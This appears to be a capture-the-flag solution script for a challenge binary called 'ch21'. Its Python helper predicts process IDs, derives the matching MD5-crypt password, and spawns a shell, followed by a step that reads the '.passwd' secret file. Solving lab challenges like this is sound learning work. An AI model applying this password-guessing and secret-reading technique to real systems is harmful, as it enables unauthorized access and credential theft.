# ssh ... < commands.sh
# needs manual intervention

f=$(mktemp)

cat << 'EOF' > $f
import subprocess
import crypt

p = subprocess.Popen(['./ch21'])
pid = p.pid
print('initial', pid)

while 1:
    pid += 1
    print(pid)
    arg = crypt.crypt(str(pid), '$1$awesome')
    p = subprocess.Popen(['./ch21', arg])
    pid = p.pid
    p.wait()
EOF

python3 $f

# enter "cat .passwd" in the shell